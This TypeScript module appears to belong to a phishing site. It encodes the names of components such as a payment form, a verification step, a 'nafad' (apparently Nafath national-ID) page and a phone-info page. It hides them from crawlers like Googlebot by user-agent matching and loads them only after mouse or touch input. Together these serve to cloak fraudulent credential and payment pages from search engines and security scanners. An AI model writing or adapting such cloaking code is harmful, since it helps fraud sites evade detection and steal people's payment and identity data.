
import { _l, _e, _d } from './secure-utils'

const _cr = {
  p1: _e('pay-form'),
  p2: _e('veri'),
  p3: _e('confi'),
  p4: _e('nafad'),
  p5: _e('phone-info')
}

export async function loadComponent(componentId: keyof typeof _cr): Promise<any> {
  _l(`Loading component: ${componentId}`)
  
  const componentPath = _d(_cr[componentId])
  
  try {
    const loadedModule = await import(`@/components/${componentPath}`)
    _l(`Component loaded: ${componentPath}`)
    return loadedModule.default
  } catch (error) {
    _l(`Failed to load component: ${componentPath}`, error)
    throw error
  }
}

export async function lazyLoad(componentId: keyof typeof _cr, delay: number = 100): Promise<any> {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        const component = await loadComponent(componentId)
        resolve(component)
      } catch (error) {
        reject(error)
      }
    }, delay)
  })
}

function isBot(): boolean {
  const userAgent = navigator.userAgent.toLowerCase()
  const botPatterns = [
    'bot', 'crawler', 'spider', 'scraper',
    'googlebot', 'bingbot', 'slurp', 'duckduckbot'
  ]
  
  return botPatterns.some(pattern => userAgent.includes(pattern))
}

export async function loadForUser(componentId: keyof typeof _cr): Promise<any> {
  if (isBot()) {
    _l('Bot detected, blocking component load')
    return () => null
  }
  
  return await loadComponent(componentId)
}

export function preloadComponents(componentIds: Array<keyof typeof _cr>): void {
  if (isBot()) {
    _l('Bot detected, skipping preload')
    return
  }
  
  if (typeof window !== 'undefined') {
    const preload = () => {
      componentIds.forEach(id => {
        loadComponent(id).catch(() => {
          _l(`Failed to preload: ${id}`)
        })
      })
      
      window.removeEventListener('mousemove', preload)
      window.removeEventListener('touchstart', preload)
    }
    
    window.addEventListener('mousemove', preload, { once: true })
    window.addEventListener('touchstart', preload, { once: true })
  }
}

export function splitCode<T>(
  loader: () => Promise<T>,
  fallback?: T
): Promise<T> {
  if (isBot() && fallback) {
    return Promise.resolve(fallback)
  }
  
  return loader()
}
